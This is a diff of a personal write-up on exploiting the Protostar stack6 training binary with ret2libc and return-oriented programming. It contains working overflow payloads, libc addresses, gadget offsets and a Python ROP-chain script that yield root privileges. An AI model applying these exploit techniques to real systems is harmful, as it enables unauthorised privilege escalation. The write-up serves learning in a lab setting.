@@ -40,14 +40,17 @@ In other words, `gets` will keep reading until it encounters a newline with no b
 The check at line 17 is making sure that the return address of the `getpath` function does not start with `0xbf`. What's so special about addresses beginning with `0xbf`, I hear you ask. It turns out that addresses beggning with `0xbffff` are part of the stack [1][2], so really this code is making sure to enforce an NX (non-executable) stack, so we can't just godd-'ol point EIP to our buffer and execute any shellcode we want from the stack.
 
 # NX-stack Exploitation
+
+## General Methodology 
+
 What exactly is an NX-Stack and why would the stack be NX ?! It is a binary exploitation mitigation, introduced to counter stack-based buffer overflows [3], along with stack canaries[4]. The general idea is that by marking the stack as Readable, Writeable and Non-Executable the processor is prevented from executing instructions from the stack (and hence potentially malicious input). In contrast, memory regions that contain code and are marked as Read-Only and Executable in an effort to ensure code integrity and thus add a security layer.
 
 So now the game is somewhat harder, we need to defeat the NX-stack. There are two ways to do this, and I did both just to check that I could. The first way is by returning to a libc function of choice, and the broader category is known as ret2libc attacks. When this is not possible, you can result to crafting a Return-Oriented Programming (ROP) payload, but this is considerably harder and more time consuming.
 
 Both of these techniques assume that ASLR [5] is not enabled (and from now on we will assume it to be true for the rest of the article).
 
-# Exploitation
-## Setup 
+## Exploitation
+### Setup 
 
 To make things easier for us, we need to do two things:
 * enable coredumps -> `$ ulimit -c unlimited`
@@ -57,7 +60,7 @@ To make things easier for us, we need to do two things:
 These will allow us to inspect the process as it crashes or hits a breakpoint, allowing us to verify our logic step by step. Debugger interrupt is `int 3` or `0xCC`, and we can look for one using `objdump`:
 
 ```
-user@protostar:/opt/protostar/bin$ objdump -s ./stack6 | grep -e cc
+$ objdump -s ./stack6 | grep -e cc
 8048248 1a000000 cc850408 04000000 11001000  ................
                  ^- here
 ```
@@ -67,7 +70,7 @@ Bingo, we were lucky found a break point on `0x0804824c`. Conveniently, this is 
 Now we need to make our binary crash, and by trying a few different offsets we find that `80` bytes of padding are enough for the next `4` bytes to overwrite EIP:
 
 ```bash
-user@protostar:/opt/protostar/bin$ python -c 'print "A" * 80 + "BBBB"' | ./stack6
+$ python -c 'print "A" * 80 + "BBBB"' | ./stack6
 input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBAAAAAAAAAAAABBBB
 Segmentation fault (core dumped)
 root@protostar:/opt/protostar/bin# gdb -q ./stack6 /tmp/core.11.stack6.1562 
@@ -77,7 +80,7 @@ Program terminated with signal 11, Segmentation fault.
 
 Testing our breakpoint: 
 ```bash
-user@protostar:/opt/protostar/bin$ python -c 'print "A" * 80 + "\x4c\x82\x04\x08"' | ./stack6
+$ python -c 'print "A" * 80 + "\x4c\x82\x04\x08"' | ./stack6
 input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALAAAAAAAAAAAAL�
 Trace/breakpoint trap (core dumped)
 root@protostar:/opt/protostar/bin# gdb -q ./stack6 /tmp/core.5.stack6.1566 
@@ -103,7 +106,7 @@ So we know that the stack exactly before `getpath` is called containes a return 
 |  our buffer    |
  ________________ < ebp 
 |    old ebp     |
- ________________
+ ________________ < target no 1
 | return address |
  ________________
 | other things   |
@@ -113,7 +116,7 @@ So we know that the stack exactly before `getpath` is called containes a return 
 
 We now have a way to debug our logic, know what the memory layout looks like and can reliably trigger the bug!
 
-## Ret2libc
+### Exploitation
 So what actually is a ret2libc attack? This puzzled me for ages, but turns out it is reasonably straightforward. The idea is that basically after you take control of EIP  by means of an stack-based buffer overflow you can redirect the execution flow towards system functions found in libc. This is done by overwriting the return address stored on the stack with the your target function's entrypoint. This is the big picture, but of course there are more details to this and a very handy article to talk about this is [6].
 
 In order to carry out our attack, we need to figure out the following:
@@ -132,9 +135,9 @@ Seeing as we are trying to escalate our priviledges, we should call the `system`
  ________________ < ebp 
 |    old ebp     |
  ________________
-| system entry   |
+| system address |
  ________________
-| exit   entry   |
+| exit   address |
  ________________
 | pointer to     |
 | /bin/sh        | 
@@ -162,9 +165,9 @@ So the stack now has to look like:
  ________________ < ebp 
 |    old ebp     |
  ________________
-| system entry   |
+| system address |
  ________________
-| exit   entry   |
+| exit   address |
  ________________
 | pointer to     |
 | /bin/sh        |
@@ -191,19 +194,31 @@ Run this and inspecting the coredump, we see:
 And this is where things went wrong for me. Turns out, as described in [1], that gdb will setup some additional environment variables and that will impact the actual offsets of addresses on the stack when you run outside gdb. So whilst in GDB the address is `0xbffff808`, outside gdb it was `0xbffff7f8`. I found that pretty much by hand, by incrementing the pointer to my string by 10 bytes at a time - which was super tedious. Putting all of this together, we have:
 
 ```bash
-user@protostar:/opt/protostar/bin$ python -c 'print "A" * 80 + "\xb0\xff\xec\xb7" + "\xc0\x60\xec\xb7" + "\xf8\xf7\xff\xbf" + "/usr/bin/id"'  | ./stack6
+$ python -c 'print "A" * 80 + "\xb0\xff\xec\xb7" + "\xc0\x60\xec\xb7" + "\xf8\xf7\xff\xbf" + "/usr/bin/id"'  | ./stack6
 input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAA����`�����/usr/bin/id
 uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
 ```
 
-Sweet! Since `/usr/bin/id` shows we are root, effectively any program we run will run as root!
+Sweet! Since `/usr/bin/id` shows we are root, effectively any program we run will run as root. We can run any program we run as root by simply modifying our exploit to run our target binary instead of `/usr/bin/id` like this:
 
+```bash
+python -c 'print "A" * 80 + "\xb0\xff\xec\xb7" + "\xc0\x60\xec\xb7" + "\xf8\xf7\xff\xbf" + "/path/to/target"'
+```
 
-## ROP
+# Return Oriented Programming - ROP
 
-Right, time to get the big guns out. Before this challenge I had no idea how ROP worked, and it still feels like it, but now I have written one ROP-chain and I have found the many ways in which it can hurt you!
+## General Methodology
 
-First off, what is return-oriented programing ?! In the simplest terms, it's a shell-coding technique where various x86 instructions (otherwise knows as gadgets) are stringed together (aka you jump between them) using `ret` statements to get to the next one. This is feasible because once you have found the gadges you want to use, you push their addresses on stack as part of the input and then once the first gadget executes, it returns to the topmost address on the stack, which is the address of gadget 2, and so on. In essence your stack will mostly contain addresses and very little actual shellcode. As an illustration:
+Right, time to get the big guns out! Before this challenge I had no idea how ROP worked and it still feels like it a bit, but now I have written one ROP-chain and I have found the many ways in which it can hurt you!
+
+First off, some terminology:
+* What is a gadget? It is a (usually) short sequence of assembly instructions, followed by a `ret` instruction.
+* Why is this style of exploitation called ROP? because we make heavy use of the `ret` instruction.
+* Why are we `ret`urning so much? 
+* What is a ROP-chain? This is because we are chaining multiple gadgets togdther.
+* Where are these gadgets? In memory because they are instructions already loaded in memory as part of the the binary's legitimate functionality. 
+
+So in the simplest terms, ROP a shell-coding technique where various x86 instructions (gadgets) are stringed together using `ret` to jump to addresses found on the stack. This is feasible because once you have found the gadges you want to use, you push their addresses on stack as part of the input and then once the first gadget executes, it returns to the topmost address on the stack, causing execution to continue from the address of gadget 2, and then it return to the topmost address on the stack, causing gadget 3 to be executed, and so on. In essence your stack will mostly contain addresses and some data, but no shellcode. As an illustration:
 
 ```
  ________________ 
@@ -220,16 +235,91 @@ First off, what is return-oriented programing ?! In the simplest terms, it's a s
 | matter         |
 ```
 
+If this all sounds kind of hard, then you're not alone - it is. Why would you choose to use ROP over ret2libc?! In a hardened system, you might not have access to system at all (i.e. it might have been compiled out), or you might be up against an ASCII-armoured system [7].
+
+## Exploitation
+### Setup
+
+So how do you figure out which gadgets you need to use? This will depend on what you want to do. In our case, we're trying to execute an arbitrary program (just like with ret2libc) and the way we are going to do this is by using the `execve` syscall. From the man-page we need to setup a few registers for this to work and then perform a syscall interrupt:
+
+```bash
+EAX = 11 (or 0x0B in hex) – The execve syscall number
+EBX = Address in memory of the string “/bin/sh”
+ECX = Address of a pointer to the string “/bin/sh”
+EDX = null
+```
+
+In order to figure out which gadgets we should use we will write our payload in assembly so that it will achieve the above steps, and then attempt to find the most relevant gadgets. So, step one:
+
+```arm
+xor  edx, edx
+push edx
+mov  ecx, esp
+mov  eax, 0xb
+push 0x00
+push 0x
+mov  ebx, esp
+int  0x80
+```
+
+Step two would be finding our gadgets! First lets look at the shared libraries that this binary is linking to by using gdb:
+```bash
+$ gdb -q ./stack6 
+(gdb) b main
+Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.
+(gdb) run
+Breakpoint 1, main (argc=1, argv=0xbffff864) at stack6/stack6.c:27
+(gdb) info sharedlibrary 
+From        To          Syms Read   Shared Object Library
+0xb7fe3830  0xb7ff988f  Yes (*)     /lib/ld-linux.so.2
+0xb7eada50  0xb7fa14cc  Yes (*)     /lib/libc.so.6
+```
+No surprises there, libc is everpresent! Now to find out where it's being loaded, we will need to inspect it
+
+```bash
+user@protostar:/opt/protostar/bin$ ps aux | grep -e '[s]tack6'
+root      2265  0.0  0.0   1536   320 pts/1    S+   01:37   0:00 /opt/protostar/bin/stack6
+root@protostar:/opt/protostar/bin# cat /proc/2265/maps
+....
+b7e97000-b7fd5000 r-xp 00000000 00:10 759        /lib/libc-2.11.2.so <-- this
+....
+```
+
+### Exploitation
+
+```python
+import struct
+import sys
+
+def l(n):
+    lib_c_base = 0xb7e97000
+    return p(lib_c_base + n)
+
+def p (i):
+    return struct.pack('I', i)
+
+bp = p(0x0804824c)
+padding = "A" * 80
+pop_edx = l(0x1a9e)
+NULL="\x00\x00\x00\x00"
+add_esp_12 = l(0x3900e)
+binsh_str = "/tmp/sh\x00\x00\x00\x00\x00"
+push_esp = l(0xc24f7)
+dec_ebx = l(0x12acce)
+add_ecx_ebx = l(0xcaf24)
+set_eax_interrupt = l(0x97193)
+
+fmt = "{0}{1}{2}{3}{4}{5}{6}" + "{8}"*9 + "{10}" + "{8}"*7 +"{9}"
+sys.stdout.write(fmt.format(padding, pop_edx, NULL, add_esp_12, binsh_str, push_esp, NULL, bp, dec_ebx, set_eax_interrupt, add_ecx_ebx).strip())
+sys.stdout.flush()
+```
+
 ================ ROP ==============
 
 ROP ?! I think the overal strategy with this is to use ROP to get a syscall going, using sys_execve
 
 for this we need: (https://failingsilently.wordpress.com/2017/12/14/rop-chain-shell/)
-	EAX = 11 (or 0x0B in hex) – The execve syscall number
-	EBX = Address in memory of the string “/bin/sh”
-	ECX = Address of a pointer to the string “/bin/sh”
-	EDX = null
-	call instruction int 0x80 (interupt syscall)
+
 
 The first part of the payload will be the same, because it triggers the overflow, and then the stack should look like:
 
@@ -250,6 +340,12 @@ I have a new approach!
 0x000caf24 : add ecx, ebx ; ret					# set ecx = ebx
 0x00097193 : mov eax, 0xb ; int 0x80 				# setup the interrupt
 
+# Closing Thoughts
+* push reg; ret instructions will fuck you up
+* finding where things are loaded in ram can be an ass
+* a debugger will mess you up in weird ways
+* find bad bytes you have to worry about
+
 
 [1] - https://stackoverflow.com/a/17775966/1366384
 [2] - https://www.coengoedegebure.com/buffer-overflow-attacks-explained/
@@ -257,3 +353,4 @@ I have a new approach!
 [4] - https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries
 [5] - https://en.wikipedia.org/wiki/Stack_buffer_overflow#Randomization
 [6] - https://www.shellblade.net/files/docs/ret2libc.pdf
+[7] - https://security.stackexchange.com/questions/36462/
